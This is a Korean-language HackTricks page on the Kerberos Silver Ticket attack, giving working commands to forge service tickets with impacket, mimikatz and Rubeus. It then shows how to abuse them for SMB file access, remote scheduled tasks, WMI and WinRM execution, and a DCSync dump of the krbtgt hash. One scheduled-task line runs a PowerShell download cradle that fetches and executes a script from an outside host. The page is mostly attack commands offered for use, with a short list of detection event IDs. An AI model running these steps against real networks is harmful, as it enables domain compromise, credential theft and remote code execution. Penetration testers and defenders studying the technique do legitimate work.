# 실버 티켓

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**를** **팔로우**하세요.
* **Hacking 트릭을 공유하려면** [**HackTricks**](https://github.com/carlospolop/hacktricks) **및** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **github 저장소에 PR을 제출**하세요.

</details>

<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">

**해킹 경력**에 관심이 있고 해킹할 수 없는 것을 해킹하고 싶다면 - **우리는 고용 중입니다!** (_유창한 폴란드어 필수_).

{% embed url="https://www.stmcyber.com/careers" %}

## 실버 티켓

**실버 티켓(Silver Ticket)** 공격은 Active Directory (AD) 환경에서 서비스 티켓을 악용하는 것을 포함합니다. 이 방법은 컴퓨터 계정과 같은 서비스 계정의 NTLM 해시를 획득하여 티켓 발급 서비스(TGS) 티켓을 위조하는 데 의존합니다. 이 위조된 티켓을 사용하여 공격자는 네트워크에서 특정 서비스에 액세스할 수 있으며, 일반적으로 관리 권한을 목표로 다른 사용자를 가장할 수 있습니다. 티켓 위조에는 AES 키를 사용하는 것이 더 안전하고 감지하기 어렵다는 점이 강조됩니다.

티켓 생성을 위해 운영 체제에 따라 다른 도구가 사용됩니다:

### Linux에서
```bash
python ticketer.py -nthash <HASH> -domain-sid <DOMAIN_SID> -domain <DOMAIN> -spn <SERVICE_PRINCIPAL_NAME> <USER>
export KRB5CCNAME=/root/impacket-examples/<TICKET_NAME>.ccache
python psexec.py <DOMAIN>/<USER>@<TARGET> -k -no-pass
```
### Windows에서
```bash
# Create the ticket
mimikatz.exe "kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> /rc4:<HASH> /user:<USER> /service:<SERVICE> /target:<TARGET>"

# Inject the ticket
mimikatz.exe "kerberos::ptt <TICKET_FILE>"
.\Rubeus.exe ptt /ticket:<TICKET_FILE>

# Obtain a shell
.\PsExec.exe -accepteula \\<TARGET> cmd
```
CIFS 서비스는 희생자의 파일 시스템에 액세스하기 위한 일반적인 대상으로 강조되지만, HOST 및 RPCSS와 같은 다른 서비스도 작업 및 WMI 쿼리를 위해 악용될 수 있습니다.

## 사용 가능한 서비스

| 서비스 유형                                | 서비스 실버 티켓                                                         |
| ------------------------------------------ | -------------------------------------------------------------------------- |
| WMI                                        | <p>HOST</p><p>RPCSS</p>                                                    |
| PowerShell 원격                            | <p>HOST</p><p>HTTP</p><p>OS에 따라 다음도 포함됩니다:</p><p>WSMAN</p><p>RPCSS</p> |
| WinRM                                      | <p>HOST</p><p>HTTP</p><p>일부 경우에는 WINRM만 요청할 수도 있습니다.</p> |
| 예약된 작업                               | HOST                                                                       |
| Windows 파일 공유, 또한 psexec              | CIFS                                                                       |
| LDAP 작업, DCSync 포함                     | LDAP                                                                       |
| Windows 원격 서버 관리 도구                 | <p>RPCSS</p><p>LDAP</p><p>CIFS</p>                                         |
| 골든 티켓                                  | krbtgt                                                                     |

**Rubeus**를 사용하여 다음 매개변수를 사용하여 이러한 티켓을 **요청**할 수 있습니다:

* `/altservice:host,RPCSS,http,wsman,cifs,ldap,krbtgt,winrm`

### 실버 티켓 이벤트 ID

* 4624: 계정 로그온
* 4634: 계정 로그오프
* 4672: 관리자 로그온

## 서비스 티켓 남용

다음 예제에서는 티켓을 관리자 계정을 흉내내어 검색한 것으로 가정합니다.

### CIFS

이 티켓을 사용하면 **SMB**를 통해 `C$` 및 `ADMIN$` 폴더에 액세스할 수 있으며 (노출되어 있는 경우) 원격 파일 시스템의 일부로 파일을 복사할 수 있습니다. 다음과 같이 수행하기만 하면 됩니다:
```bash
dir \\vulnerable.computer\C$
dir \\vulnerable.computer\ADMIN$
copy afile.txt \\vulnerable.computer\C$\Windows\Temp
```
호스트 내에서 쉘을 획득하거나 **psexec**를 사용하여 임의의 명령을 실행할 수도 있습니다:

{% content-ref url="../ntlm/psexec-and-winexec.md" %}
[psexec-and-winexec.md](../ntlm/psexec-and-winexec.md)
{% endcontent-ref %}

### 호스트

이 권한을 가지면 원격 컴퓨터에서 예약된 작업을 생성하고 임의의 명령을 실행할 수 있습니다:
```bash
#Check you have permissions to use schtasks over a remote server
schtasks /S some.vuln.pc
#Create scheduled task, first for exe execution, second for powershell reverse shell download
schtasks /create /S some.vuln.pc /SC weekly /RU "NT Authority\System" /TN "SomeTaskName" /TR "C:\path\to\executable.exe"
schtasks /create /S some.vuln.pc /SC Weekly /RU "NT Authority\SYSTEM" /TN "SomeTaskName" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1''')'"
#Check it was successfully created
schtasks /query /S some.vuln.pc
#Run created schtask now
schtasks /Run /S mcorp-dc.moneycorp.local /TN "SomeTaskName"
```
### HOST + RPCSS

이러한 티켓을 사용하여 피해 시스템에서 WMI를 실행할 수 있습니다:
```bash
#Check you have enough privileges
Invoke-WmiMethod -class win32_operatingsystem -ComputerName remote.computer.local
#Execute code
Invoke-WmiMethod win32_process -ComputerName $Computer -name create -argumentlist "$RunCommand"

#You can also use wmic
wmic remote.computer.local list full /format:list
```
다음 페이지에서 **wmiexec에 대한 자세한 정보**를 찾을 수 있습니다:

{% content-ref url="../ntlm/wmicexec.md" %}
[wmicexec.md](../ntlm/wmicexec.md)
{% endcontent-ref %}

### 호스트 + WSMAN (WINRM)

컴퓨터에 대한 winrm 액세스를 통해 **액세스**할 수 있으며 PowerShell을 얻을 수도 있습니다:
```bash
New-PSSession -Name PSC -ComputerName the.computer.name; Enter-PSSession PSC
```
원격 호스트에 winrm을 사용하여 연결하는 **더 많은 방법**을 알아보려면 다음 페이지를 확인하세요:

{% content-ref url="../ntlm/winrm.md" %}
[winrm.md](../ntlm/winrm.md)
{% endcontent-ref %}

{% hint style="warning" %}
원격 컴퓨터에서 액세스하려면 **winrm이 활성화되어 있고 수신 대기**해야합니다.
{% endhint %}

### LDAP

이 권한을 사용하면 **DCSync**를 사용하여 DC 데이터베이스를 덤프 할 수 있습니다:
```
mimikatz(commandline) # lsadump::dcsync /dc:pcdc.domain.local /domain:domain.local /user:krbtgt
```
## 참고 자료
* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets)
* [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)

{% content-ref url="dcsync.md" %}
[dcsync.md](dcsync.md)
{% endcontent-ref %}

<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">

**해킹 경력**에 관심이 있고 해킹할 수 없는 것을 해킹하고 싶다면 - **저희가 고용 중입니다!** (_유창한 폴란드어 작문 및 구사 능력 필요_).

{% embed url="https://www.stmcyber.com/careers" %}

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**를** 팔로우하세요.
* **HackTricks**와 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 저장소에 PR을 제출하여 **해킹 기교를 공유하세요**.

</details>
